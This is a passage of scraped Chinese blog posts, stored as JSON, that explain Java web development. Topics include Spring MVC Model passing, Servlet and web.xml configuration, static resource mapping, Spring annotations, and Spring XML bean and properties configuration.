由于JSP天生自带session对象，可以通过在后台放入session然后再通过session取出，但是这个和Spring没什么关系，是服务器容器的一种机制 通过Spring的Model传参机制从Controller模型转入JSP页面有两种方法 返回一个String值转入JSP页面 返回一个ModelAndView类进入JSP页面 123456789101112131415@RequestMappingpublic String method1(Model model) &#123; Object object &#x3D; new Object(); model.addAttribute(&quot;object&quot;,object); return &quot;index&quot;;&#125;@RequestMappingpublic ModelAndView method2() &#123; ModelAndView view &#x3D; new ModelAndView(&quot;path:index.jsp&quot;); Object object &#x3D; new Object(); view.addObject(&quot;object&quot;,object); return view;&#125; 根据以上举例，根据不同方式传参数进入JSP的方法包括 返回值为String，需要在函数 入参里增加一个参数Model ，然后就可以放入Object在JSP页面获取到 返回值为ModelAndView里使用 addObject 然后可以在JSP页面获取到 不管使用哪种方式，JSP取数据的方式都是 ${attributeName} 根据以上代码就是 1$&#123;object&#125; Model/ModelMap/ModelAndView 的区别和联系ModelMapModelMap 是原本用于传递参数进入JSP页面的 类 ModelAndViewModelAndView 是一个类，其是对 ModelMap 和 View接口 一个封装，内部包含一个ModelMap的参数，其addObject方法，就是给内部的ModelMap添加参数 那Model是什么鬼Model 是一个接口，其实现类是 ExtendedModelMap 在Spring的2.5.1版本之后添加进来的 在2.5.1版本之后Spring使用的已经是 ExtendedModelMap 其继承于ModelMap,对Model接口进行了实现，而MdelMap是2.0版本的加进来的 1public class ExtendedModelMap extends ModelMap implements Model 因为ModelMap是其基类，所以说使用ModelMap还是有效的，但秉承着用新不用旧的原则 推荐使用 Model 接口作为返回值为String类型函数的入参数","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"JSP","slug":"JSP","permalink":"http://yoursite.com/tags/JSP/"},{"name":"Spring","slug":"Spring","permalink":"http://yoursite.com/tags/Spring/"}]},{"title":"JavaServlet可以单独加载","date":"2016-08-01T12:00:00.000Z","path":"2016/08/01/JavaServlet可以单独加载/","text":"Servlet属于谁Servlet属于JavaEE的一部分,但是也可以使用Pom单独加载 如果你用的是Java1.7+(按道理包含了Servlet3.0)，但是pom文件用的2.5的Servlet，你会发现cookie里没有setHttpOnly选项 1234567&lt;!--Java Servlet--&gt;&lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;&#x2F;groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;&#x2F;artifactId&gt; &lt;version&gt;$&#123;servlet.version&#125;&lt;&#x2F;version&gt;&lt;&#x2F;dependency&gt;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Servlet","slug":"Servlet","permalink":"http://yoursite.com/tags/Servlet/"}]},{"title":"Spring的Controller/Service/Component","date":"2016-08-01T12:00:00.000Z","path":"2016/08/01/Spring的ControllerServiceComponent/","text":"Spring的注解Spring提供的注解有4个，方便用户管理不同职责的Bean @Component : 最原始的Bean，可以被Spring的配置文件ComponentScan扫描到 @Controller: MVC里的V，也就是视图层面的Bean，所以我们在Controller里返回JSP文件 @Service : MVC里的C，逻辑层的Bean，用于处理实际业务 @Repository: MVC里的M，用于连接数据库，但是由于Mybatis和Hibernate的存在有时候会被人遗忘 好伤心。。。 根据以上四个注解，Spring理想化的把后台服务进行了分层，他们之间可以通过@Autowired进行 依赖注入 PS：值得一提的是@Resource并不是Spring的注解，而是Java源生提供的 Spring注解之间的区别Spring四个逻辑注解并没有什么绝对的区别，他们是不管你放在代码的哪一层，都可以被扫描，所以才会有Spring和SpringMVC配置冲突倒是事务失效，就是因为视图层的SpringMVC秒扫了逻辑层的@Service注解","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"http://yoursite.com/tags/Spring/"}]},{"title":"XML配置文件中Classpath指的哪里","date":"2016-08-01T05:00:00.000Z","path":"2016/08/01/XML配置文件中Classpath指的哪里/","text":"Project如何变成War包对于Maven来讲，打包成War包需要在Pom.xml里进行设置,参考Maven讲解 12345&lt;project&gt;&lt;packaging&gt;war&lt;&#x2F;packaging&gt;&lt;&#x2F;project&gt; 打包成war包Java做了什么首先要明白，一个Servlet的Webapp工程由以下三部分组成，位于 src/main/ 的目录下 java: 存放java文件的目录 resource: 存放资源的目录(资源包括配置文件等) webapp: webapp根目录 相关知识点参考 Java的目录结构和 webapp是什么 开始打包打包开始后Servlet会将java目录和resource目录的东西放入webapp，以下是参考 打包前目录 打包后目录 src/main/java/com.company.project/ClassBean.java WEB-INF/classes/com/company/project/ClassBean.class src/main/resources/spring-mvc.xml WEB-INF/classes/spring-mvc.xml src/main/webapp/WEB-INF/web.xml WEB-INF/web.xml 从以上参考可以看出，Java源文件会被变异成class放入一个classes的目录，而resources里的东西也会直接放入classes这个目录 这个classes的目录就是一个参考点，可以在xml的配置文件里用classpath表示","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"http://yoursite.com/tags/Spring/"},{"name":"Servlet","slug":"Servlet","permalink":"http://yoursite.com/tags/Servlet/"},{"name":"Configure","slug":"Configure","permalink":"http://yoursite.com/tags/Configure/"}]},{"title":"SpringController/Servlet/静态资源/本地路径的关系梳理","date":"2016-08-01T02:00:00.000Z","path":"2016/08/01/SpringControllerServlet静态资源本地路径的关系梳理/","text":"路径当我写后台的时候，路径这个概念到后期才梳理完毕，特别我们的url和文件名起的结构目录一样，更容易迷糊，所以写这篇文章来梳理一下 都有哪些路径首先明确只有 两个路径 war包内的本地路径(服务器容器路径) http的url路径(网络请求路径) 这些路径被分散到了 不同的配置文件里 和 代码 中 web.xml配置文件web.xml作为Servlet或者说webapp的配置文件，首先对本地路径和网络路径进行了一次 映射 1234567891011121314&lt;servlet&gt; &lt;servlet-name&gt;springMvc&lt;&#x2F;servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;&#x2F;servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;&#x2F;param-name&gt; &lt;param-value&gt;classpath:spring-mvc&#x2F;spring-mvc.xml&lt;&#x2F;param-value&gt; &lt;&#x2F;init-param&gt; &lt;load-on-startup&gt;1&lt;&#x2F;load-on-startup&gt;&lt;&#x2F;servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;springMvc&lt;&#x2F;servlet-name&gt; &lt;url-pattern&gt;&#x2F;&lt;&#x2F;url-pattern&gt;&lt;&#x2F;servlet-mapping&gt; 这里看到web.xml将 网络的根路径 映射给了 SpringMVC 的转发器类 SpringMVC对静态资源对处理在通过web.xml进入SprigMVC之后，有两种方式能用户访问到静态资源，一种是映射，一种是容器目录。假设我们在Project的webapp目录下建立一种这样的目录关系 这里是本地目录 1234----webapp | |---WEB-INF |---image WEB－INF存在一个同级目录image，然后在springMVC的配置文件里进行了配置 1&lt;mvc:resources mapping&#x3D;&quot;&#x2F;imageBack&#x2F;**&quot; location&#x3D;&quot;image&#x2F;&quot;&#x2F;&gt; 此时有两种方式可以访问到image目录 这里是网络URL目录 访问路径 使用机制 url:port/project/image/image01.jpg 使用的是容器文件地址 url:port/project/imageBack/image01.jpg 使用的是SpringMVC静态资源映射 关于这两种机制的不同参考 [什么是服务器容器][] [SpringMVC配置文件][] 那你会说，这有个吊区别啊。。。。搞得这么复杂。。。 如果我改变 image文件夹的存放位置 将image文件夹置于WEB－INF内部 1234----webapp | |---WEB-INF |---image 由于WEB－INF作为webapp的安全目录，是无法通过Servlet容器的文件地址进行访问的 所以我们可以配置一个映射 1&lt;mvc:resources mapping&#x3D;&quot;&#x2F;image&#x2F;**&quot; location&#x3D;&quot;WEB-INF&#x2F;image&#x2F;&quot;&#x2F;&gt; 将安全目录中的文件夹映射出来，甚至将多个文件目录映射成一个URL目录 SpringMVC对JSP的处理在SpringMVC对动态资源的处理，也就是通常所指的JSP通常是在Controller的类中 Controller里的映射123456789101112131415@Controller@RequestMapping(value &#x3D; &quot;&#x2F;function&quot;) &lt;&#x3D;&#x3D;&#x3D;&#x3D;这里是网络地址url:port&#x2F;project&#x2F;functionpublic class BugUserController &#123; @RequestMapping &lt;&#x3D;&#x3D;&#x3D;&#x3D;这里是网络地址url:port&#x2F;project&#x2F;function public String index(Model model) &#123; return &quot;&#x2F;function&#x2F;index&quot;; &lt;&#x3D;&#x3D;&#x3D;&#x3D;这里是本地的JSP文件地址 &#125; @RequestMapping(value &#x3D; &quot;&#x2F;sign&quot;) &lt;&#x3D;&#x3D;&#x3D;&#x3D;这里是网络地址url:port&#x2F;project&#x2F;function&#x2F;sign public String sign(Model model) &#123; return &quot;&#x2F;function&#x2F;sign&quot; &lt;&#x3D;&#x3D;&#x3D;&#x3D;这里是本地的JSP文件地址 &#125; &#125; 如上所示我们可以看到 凡是带了Mapping的都是网络地址，而Controller里返回的String都是本地路径的一部分，那么本地完整的路径是什么呢？ JSP所处的实际路径根据我们SpringMVC的配置，例如 1234&lt;bean class&#x3D;&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt; &lt;property name&#x3D;&quot;prefix&quot; value&#x3D;&quot;&#x2F;WEB-INF&#x2F;pages&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;suffix&quot; value&#x3D;&quot;.jsp&quot;&#x2F;&gt;&lt;&#x2F;bean&gt; 以上Bean由Spring提供，并且会自动给Controller的返回值添加前缀后缀，根据这个配置两个文件所处的实际位置 文件名 请求URL 容器中文件实际路径｜ index.jsp url:port/project/function ../webapps/project/WEB-INF/pages/function/index.jsp sign.jsp url:port/project/function/sign ../webapps/project/WEB-INF/pages/function/sign.jsp 以上至此，再次强调SpringMVC和Servlet中路径只存在两种： 网络URL路径 和 服务器容器文件所在路径 而且注意在一切路径拼接的过程中，都是简单的字符串操作，多一个”／”和少一个”／”会造成不同的效果，需要自己定好一套规范，有人喜欢最后不带”／”，有人喜欢最后带，开头不带 为什么静态资源有两种访问机制(可以不看)因为Servlet和SpringMVC根本不是一个概念上的东西，SpringMVC只是作为一个转发第三方控件，是基于Servlet的Webapp的一个第三方库，对于源生的Servlet来讲，你允许别人访问的资源应该放在WEB-INF外部，需要保护的资源应该放入WEB-INF，这才是传统的思路，而Spring的映射功能，是Spring自己想出来的和JavaEE的设计方法不太一样","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"http://yoursite.com/tags/Spring/"},{"name":"Servlet","slug":"Servlet","permalink":"http://yoursite.com/tags/Servlet/"}]},{"title":"Servlet如何将Java代码逻辑变成网络URL","date":"2016-08-01T01:00:00.000Z","path":"2016/08/01/Servlet如何将Java代码逻辑变成网络URL/","text":"Servlet是哪里的概念首先明确Servlet是JavaEE的概念，所谓Tomcat Jetty都是基于JavaEE的一个Servlet容器，Servlet并不是Spring的概念！ Servlet在哪里配置既然Servlet是JavaEE的概念，参考文章web.xml配置文件讲解，它的配置文件肯定是web.xml Servlet如何完成地址转换在配置文件根标签web-app下有两个标签 servlet：代表后台进行逻辑处理的Java代码 servlet-mapping: 代表对外开放的URL地址 servlet和servlet-mapping一者代表Java的逻辑，一者代表对外转换的url地址，它们之间通过参数 servlet-name 作为连接手段 这个地址与静态资源不同，该地址不存在一个实质的文件，这种就是逻辑接口 接口和静态文件的区别参考接口是什么 Servlet举个栗子下面展示如何进行映射 123456789&lt;servlet&gt; &lt;servlet-name&gt;servletName&lt;&#x2F;servlet-name&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;这里和mapping中要一样 &lt;servlet-class&gt;com.company.project.web.ClassBean&lt;&#x2F;servlet-class&gt; &lt;&#x3D;&#x3D;&#x3D;你的逻辑实现类&lt;&#x2F;servlet&gt;&lt;servlet-mapping&gt; &lt;servlet-name&gt;servletName&lt;&#x2F;servlet-name&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;这里和servlet中要一样 &lt;url-pattern&gt;&#x2F;bean&lt;&#x2F;url-pattern&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;对应的url地址&lt;&#x2F;servlet-mapping&gt; 逻辑类要怎么写逻辑类要如何写才能完成Servlet也就是Http报文的逻辑呢？JavaEE为你准备好了一个类 HttpServlet，你只需要对其进行实现，里面就有一些http常用的概念让你使用 12345678910111213public class ClassBean extends HttpServlet &#123; @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; &#x2F;&#x2F;Do Something &#125; @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; &#x2F;&#x2F;Do Something &#125;&#125; 比如我们常见的Get和Post，后台具体做了什么操作，就可以在这个逻辑函数里完成，其中 request: 这个是对请求报文的分拆和包装 response: 完成逻辑处理后，把返回的东西放入response，Servlet就会帮你返回给发送者 总结根据以上栗子，每当你访问 url:port/project/bean这个地址时，就会完成ClassBean里的逻辑处理 难道我有100个地址，要写100份web.xml文件么？我们知道了Servlet如何工作，那么实际应用中我有无数个接口该怎么办呢？我们可以把url的根目录映射给一个转发器，在转发器内部完成url的管理，SpringMVC就是完成的这个功能，参考文章web.xml的配置文件看如何把SpringMVC加入Servlet 使用注解式Servlet在Servlet 3.0里，Java推出了注解式Servlet，比写web.xml更为方便 12345@WebServlet(name &#x3D; &quot;servletName&quot;, value &#x3D; &quot;&#x2F;bean&quot;)public class ClassBean extends HttpServlet &#123;&#125; 可以进入其源代码文件查看每一项属性的意义 12345678910111213141516171819202122232425262728@Target(&#123;ElementType.TYPE&#125;)@Retention(RetentionPolicy.RUNTIME)@Documentedpublic @interface WebServlet &#123; &#x2F;** * The name of the servlet servlet的名称 *&#x2F; String name() default &quot;&quot;; &#x2F;** * The URL patterns of the servlet url地址，同urlPatterns *&#x2F; String[] value() default &#123;&#125;; &#x2F;** * The URL patterns of the servlet url地址 同value *&#x2F; String[] urlPatterns() default &#123;&#125;; &#x2F;** * The load-on-startup order of the servlet *&#x2F; int loadOnStartup() default -1; ........ &#125;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Servlet","slug":"Servlet","permalink":"http://yoursite.com/tags/Servlet/"},{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"}]},{"title":"JavaEE/JavaSE/JavaME的区别","date":"2016-07-31T11:00:00.000Z","path":"2016/07/31/JavaEEJavaSEJavaME的区别/","text":"一句话总结 Java SE:是做电脑上运行的软件。 Java EE:是用来做网站的（我们常见的JSP技术） Java ME:是做手机软件的 Java SEJava SE（Java Platform，Standard Edition）。Java SE 以前称为 J2SE。它允许开发和部署在桌面、服务器、嵌入式环境和实时环境中使用的 Java 应用程序。 Java EEJava EE（Java Platform，Enterprise Edition）。这个版本以前称为 J2EE。企业版本帮助开发和部署可移植、健壮、可伸缩且安全的服务器端 Java 应用程序。 Java MEJava ME（Java Platform，Micro Edition）。这个版本以前称为 J2ME。Java ME 为在移动设备和嵌入式设备（比如手机、PDA、电视机顶盒和打印机）上运行的应用程序提供一个健壮且灵活的环境。","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"}]},{"title":"Spring启动时执行自定义初始化工作","date":"2016-07-30T06:00:00.000Z","path":"2016/07/30/Spring启动时执行自定义初始化工作/","text":"Spring启动时执行一些初始化工作Spring提供了一个接口 InitializingBean 来在启动之前执行一些初始化工作，内部仅有一个函数 afterPropertiesSet 只需要写个自定义实现,然后打个@Component注解让Spring扫描一下就可以了 12345678910@Componentpublic class InitRoleScore implements InitializingBean &#123; @Override public void afterPropertiesSet() throws Exception &#123; &#x2F;&#x2F;Do Something &#125;&#125;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"http://yoursite.com/tags/Spring/"}]},{"title":"在动态代理中取Target","date":"2016-07-30T06:00:00.000Z","path":"2016/07/30/在动态代理中取Target/","text":"动态代理取Target本文作废，Spring有提供的工具，不用自己写，参考新文章 如果对某些函数执行了动态代理，那么可能造成反射无法获得函数原本对Class，而是获得的JDK动态代理，所以需要从动态代理中找到原本Object的指针 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061public class ReflectionUtil &#123; &#x2F;** * 获取 代理目标对象 * * @param proxy 代理对象 * @return 目标对象 * @throws Exception *&#x2F; public static Object getTarget(Object proxy) throws Exception &#123; &#x2F;&#x2F; 不是代理对象 if (!AopUtils.isAopProxy(proxy)) &#123; return proxy; &#125; &#x2F;&#x2F; 如果是JdkDynamicProxy代理对象 if (AopUtils.isJdkDynamicProxy(proxy)) &#123; return getJdkDynamicProxyTargetObject(proxy); &#x2F;&#x2F; 如果是Cglib代理对象 &#125; else &#123; return getCglibProxyTargetObject(proxy); &#125; &#125; &#x2F;** * 获取Cglib目标对象 * * @param proxy 代理对象 * @return 目标对象 * @throws Exception *&#x2F; private static Object getCglibProxyTargetObject(Object proxy) throws Exception &#123; Field h &#x3D; proxy.getClass().getDeclaredField(&quot;CGLIB$CALLBACK_0&quot;); h.setAccessible(true); Object dynamicAdvisedInterceptor &#x3D; h.get(proxy); Field advised &#x3D; dynamicAdvisedInterceptor.getClass().getDeclaredField(&quot;advised&quot;); advised.setAccessible(true); Object target &#x3D; ((AdvisedSupport) advised.get(dynamicAdvisedInterceptor)).getTargetSource().getTarget(); return target; &#125; &#x2F;** * 获取JdkDynamicProxy目标对象 * * @param proxy 代理对象 * @return 目标对象 * @throws Exception *&#x2F; private static Object getJdkDynamicProxyTargetObject(Object proxy) throws Exception &#123; Field h &#x3D; proxy.getClass().getSuperclass().getDeclaredField(&quot;h&quot;); h.setAccessible(true); AopProxy aopProxy &#x3D; (AopProxy) h.get(proxy); Field advised &#x3D; aopProxy.getClass().getDeclaredField(&quot;advised&quot;); advised.setAccessible(true); Object target &#x3D; ((AdvisedSupport) advised.get(aopProxy)).getTargetSource().getTarget(); return target; &#125;&#125;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Reflect","slug":"Reflect","permalink":"http://yoursite.com/tags/Reflect/"}]},{"title":"SpringMVC配置文件","date":"2016-07-30T04:00:00.000Z","path":"2016/07/30/SpringMVC配置文件/","text":"SpringMVCSpringMVC和Spring本身并不是同一个Jar包，但是由于都是一个体系，所以十分相似，概念请参考Spring配置文件，这里仅仅对一些常用配置进行解释 根节点SpringMVC也使用beans作为根节点 1234&lt;beans&gt;&lt;&#x2F;beans&gt; 开启注解同Spring一样开启注解扫描 1234&lt;beans&gt; &lt;mvc:annotation-driven&#x2F;&gt; &lt;context:component-scan base-package&#x3D;&quot;com.company.project&quot;&#x2F;&gt;&lt;&#x2F;beans&gt; 静态资源处理静态资源是指图片，CSS，JS等，参考知识点 静态资源和服务器容器地址映射 我们可以知道，容器的作用就是把一个本地目录映射成一个网络路径，既然是映射，也就是说可以不完全相同 resources有两个标签 mapping:以url:port/project为根目录的网络URL路径 注意要是用斜杠代表根目录双星号代表任意文件 location:以webapp为根目录的服务器容器路径，就是webapps/project.war 的webapps/project/*这个路径 而default-servlet-handler代表对静态资源采用默认对servlet方法进行处理 12345678910&lt;beans&gt; ...... &lt;mvc:default-servlet-handler&#x2F;&gt; &lt;mvc:resources mapping&#x3D;&quot;&#x2F;image&#x2F;**&quot; location&#x3D;&quot;image&#x2F;&quot;&#x2F;&gt; &lt;mvc:resources mapping&#x3D;&quot;&#x2F;imageBack&#x2F;**&quot; location&#x3D;&quot;image&#x2F;&quot;&#x2F;&gt; &lt;mvc:resources mapping&#x3D;&quot;&#x2F;imageBack&#x2F;**&quot; location&#x3D;&quot;image&#x2F;,image&#x2F;icon&#x2F;&quot;&#x2F;&gt;&lt;&#x2F;beans&gt; 服务器容器文件 可选访问地址 webapps/project/image/image01.jpg url:port/project/image/image01.jpgurl:port/project/imageBack/image01.jpg webapps/project/image/icon/icon01.jpg url:port/project/imageBack/icon/icon01.jpgurl:port/project/imageBack/icon01.jpg 从上表可以看出静态资源映射是可以一对多，也可以多对一，网路路径是很折腾人的一个事情，特别是名字起的近似的时候，关于路径的梳理请参考文章SpringController/Servlet/静态资源/本地路径的关系梳理 拦截器SpringMVC本身也具有自定义拦截器的功能，比如我们在常见的登录操作里，肯定会有一些拦截判断，可以通过自定义拦截器 LoginInterceptor 实现 123456789101112&lt;beans&gt; ...... &lt;mvc:interceptors&gt; &lt;mvc:interceptor&gt; &lt;mvc:mapping path&#x3D;&quot;&#x2F;login&#x2F;**&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;拦截login这个URL地址下的请求 &lt;mvc:exclude-mapping path&#x3D;&quot;&#x2F;image&#x2F;**&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;不拦截图片URL下的请求 &lt;bean class&#x3D;&quot;com.company.project.filter.LoginInterceptor&quot;&#x2F;&gt; &lt;&#x2F;mvc:interceptor&gt;&lt;&#x2F;mvc:interceptors&gt;&lt;&#x2F;beans&gt; 一些Spring提供的常用功能SpringController里返回地址加前缀和后缀在Spring的Controller注解下，如果有以String为返回值类型的函数，可以对其自动添加前缀后缀，方便其找到对应对JSP文件 123456789&lt;beans&gt; ..... &lt;!-- 配置页面文件后缀名 --&gt; &lt;bean class&#x3D;&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&gt; &lt;property name&#x3D;&quot;prefix&quot; value&#x3D;&quot;&#x2F;WEB-INF&#x2F;pages&quot;&#x2F;&gt; &lt;property name&#x3D;&quot;suffix&quot; value&#x3D;&quot;.jsp&quot;&#x2F;&gt; &lt;&#x2F;bean&gt;&lt;&#x2F;beans&gt; IE这个老顽固有时候IE浏览器会对返回对JSON报文执行下载操作变成文件，影响Ajax操作 1234567891011121314151617181920212223&lt;beans&gt; ...... &lt;!--避免IE执行AJAX时，返回JSON出现下载文件 --&gt; &lt;bean id&#x3D;&quot;stringHttpMessageConverter&quot; class&#x3D;&quot;org.springframework.http.converter.StringHttpMessageConverter&quot;&gt; &lt;property name&#x3D;&quot;supportedMediaTypes&quot;&gt; &lt;list&gt; &lt;value&gt;text&#x2F;plain;charset&#x3D;UTF-8&lt;&#x2F;value&gt; &lt;&#x2F;list&gt; &lt;&#x2F;property&gt; &lt;&#x2F;bean&gt; &lt;bean class&#x3D;&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter&quot;&gt; &lt;property name&#x3D;&quot;messageConverters&quot;&gt; &lt;list&gt; &lt;ref bean&#x3D;&quot;stringHttpMessageConverter&quot;&#x2F;&gt; &lt;&#x2F;list&gt; &lt;&#x2F;property&gt; &lt;&#x2F;bean&gt;&lt;&#x2F;beans&gt;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"http://yoursite.com/tags/Spring/"},{"name":"Servlet","slug":"Servlet","permalink":"http://yoursite.com/tags/Servlet/"},{"name":"Configure","slug":"Configure","permalink":"http://yoursite.com/tags/Configure/"}]},{"title":"Spring的applicationContext配置文件","date":"2016-07-30T04:00:00.000Z","path":"2016/07/30/Spring的applicationContext配置文件/","text":"Spring的配置文件Spring是作为WebServlet的Context的一部分发挥自己IOC容器的作用的，参考以下文章 web.xml配置文件 IOC容器 Web框架的工作流程 那么Spring的配置文件由什么组成呢 Spring配置做什么由文章3我们知道，作为IOC容器，其本质就是一次性实例化一些类，并且为这些类保持单例模式 所以Spring的配置文件主要就是配置!!哪些类需要实例化!! Spring的根元素Spring配置文件以一个Beans标签作为根元素 注意这里是复数bean加了s 1234&lt;beans&gt;......&lt;&#x2F;beans&gt; 实例化Bean的两种方式有两种类我们需要进行实例化 自己写的实现类 某些第三方库里已经写好实现的类，如JDBC 对于这些类的实例化，有两种实例化方法，用哪种都可以，但是一般来讲对于前者我们采用 注解 的方式，对于后者我们采用 XML配置的方式 使用注解扫描实例化Bean采用以下配置，就可以通过扫描注解的方式实例化Bean,哪些Bean会被扫描参考这里，以及配置上关于事务的一些坑 1234567&lt;beans&gt;&lt;context:annotation-config&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;开启采用注解方式实例化Bean&lt;context:component-scan base-package&#x3D;&quot;com.company.project&quot;&#x2F;&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;去某个包名下进行扫描......&lt;&#x2F;beans&gt; 采用XML配置的方式采用XML配置的方式，就是把写好的类的类名和属性值用XML结构表示出来，以JDBC作为举例 12345678910&lt;beans&gt; &lt;bean id&#x3D;&quot;dataSource&quot; class&#x3D;&quot;org.apache.commons.dbcp.BasicDataSource&quot;&gt; &lt;property name&#x3D;&quot;driverClassName&quot; value&#x3D;&quot;$&#123;jdbc.driver&#125;&quot; &#x2F;&gt; &lt;property name&#x3D;&quot;url&quot; value&#x3D;&quot;$&#123;jdbc.url&#125;&quot; &#x2F;&gt; &lt;property name&#x3D;&quot;username&quot; value&#x3D;&quot;$&#123;jdbc.username&#125;&quot; &#x2F;&gt; &lt;property name&#x3D;&quot;password&quot; value&#x3D;&quot;$&#123;jdbc.password&#125;&quot; &#x2F;&gt; &lt;&#x2F;bean&gt; ....&lt;&#x2F;beans&gt; 从Spring配置的根元素Beans可以看出来，Beans是复数，那么内容主体肯定是Bean单数，上边这个Bean代表什么呢？ 123456789101112import org.apache.commons.dbcp.BasicDataSource; &lt;&#x3D;&#x3D;&#x3D;&#x3D; 由于XML中没有包名这一说，所以必须指定具体位置(class&#x3D;&quot;包名&quot;)public class Spring &#123; private BasicDataSource dataSource; &lt;&#x3D;&#x3D;&#x3D;&#x3D;就是实例化一个叫dataSource的变量(id&#x3D;&quot;dataSource&quot;) dataSource.setDriverClassName(&quot;$&#123;jdbc.driver&#125;&quot;); dataSource.setUrl(&quot;$&#123;jdbc.url&#125;&quot;); &lt;&#x3D;&#x3D;&#x3D;&#x3D;然后对实例化的变量进行赋值(property name&#x3D;&quot;&quot; value&#x3D;&quot;&quot;) dataSource.setUsername(&quot;$&#123;jdbc.username&#125;&quot;); dataSource.setPassword(&quot;$&#123;jdbc.password&#125;&quot;);&#125; ${jdbc.username}是什么由上文可见每个Bean就是简单的实例化和赋值操作，第一次接触到这个的同学可能会有疑问，${}符号代表什么意思？ ${}代表从某个配置文件中取值 Java支持文件名为 .properties 的文件存储一些变量，在XML中加载这个文件，就可以通过美元符合加大括号的形式取值，在配置文件中是以Key－Value键值对的形式储存数据的，可以放到resource目录下，参考classpath字段是什么 jdbc.properties12345jdbc.url &#x3D; jdbc:mysql:&#x2F;&#x2F;127.0.0.1:3306&#x2F;psas?useUnicode&#x3D;true&amp;characterEncoding&#x3D;utf8jdbc.username &#x3D; rootjdbc.password &#x3D; rootjdbc.driver&#x3D;com.mysql.jdbc.Driver 在Spring中加载配置文件Sping本身提供了两个类 PropertiesFactoryBean： 读取配置文件 PreferencesPlaceholderConfigurer： 加载配置文件 可以通过XML配置的方式加载配置文件 12345678&lt;!--读取配置文件--&gt;&lt;bean id&#x3D;&quot;PropertyPlaceholderConfigurer&quot; class&#x3D;&quot;org.springframework.beans.factory.config.PropertiesFactoryBean&quot;&gt; &lt;property name&#x3D;&quot;location&quot; value&#x3D;&quot;classpath:properties&#x2F;jdbc.properties&quot;&#x2F;&gt;&lt;&#x2F;bean&gt;&lt;!--加载配置文件--&gt;&lt;bean id&#x3D;&quot;propertyConfigurer&quot; class&#x3D;&quot;org.springframework.beans.factory.config.PreferencesPlaceholderConfigurer&quot;&gt; &lt;property name&#x3D;&quot;properties&quot; ref&#x3D;&quot;PropertyPlaceholderConfigurer&quot;&#x2F;&gt;&lt;&#x2F;bean&gt; 最后补充一篇小文章[如何让Spring的配置文件看起来整洁][]","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"http://yoursite.com/tags/Spring/"},{"name":"Configure","slug":"Configure","permalink":"http://yoursite.com/tags/Configure/"}]},{"title":"web.xml配置文件","date":"2016-07-30T04:00:00.000Z","path":"2016/07/30/webxml配置文件/","text":"什么是web.xml在以下的文章中 HTTP和Servlet的关系 WebServlet的工作原理 什么叫做容器 服务器容器 都提到了一个文件是web.xml，它是什么呢？ web.xml是WebServlet的配置文件，在服务器配置目录下有一份，每一个War包中也可以有各自的 通过以上四个文章，我们知道，每一个War包都是一个WebServlet服务，如果它们在自己的 WEB-INF 下有自己的web.xml则使用自己的，如果没有则使用服务器默认的web.xml 谁TM规定的web.xml文件是什么我问过很多人这个问题，一直没有人给我讲清楚。。。根据我的推测(上文)，既然他属于WebServlet的配置文件，WebServlet又是JavaEE的东西，那么Java是Sun公司发明的，Sun又被Oracle收购了，终于，终于，在Oracle的文档库里被我翻到了两篇文章WebServlet2.5 和 WebServlet3.0 两个题目都叫 A web.xml Deployment Descriptor Elements The following sections describe the standard Java EE deployment descriptor elements. 当时我还不太懂web.xml，所以在郁闷怎么有两个，其实2.5和3.0两个版本差别还是比较大的，比如以下两点，推荐尽量用最新版 Servlet2.5的Cookie不能使用setHttpOnly 如果比2.5还要低的话，是web-app里是不支持jsp-config标签的 web.xml首先要了解的配置web.xml是以 123&lt;web-app&gt;........&lt;&#x2F;web-app&gt; 为根元素的一个XML文件，其中包含的元素参考Oracle的文档，作为Servlet的入口，如果想使用任何第三方框架，都需要通过这个文件建立联系，我们以SpringMVC和Spring为例进行举例 PS: 在进行详细的配置前需要先了解XML文件中的命名空间概念 Web使用Spring的上下文根据[Oracle的文档][]WebContext作为Servlet的中对于协议 ServletContext 的一个实现，是实现Servlet功能必不可少的一个对象，我们需要把Spring加载到里面，使用以下配置 12345678910&lt;web-app .....&gt;&lt;context-param&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;根据英文翻译，就是加载Context属性 &lt;param-name&gt;contextConfigLocation&lt;&#x2F;param-name&gt; 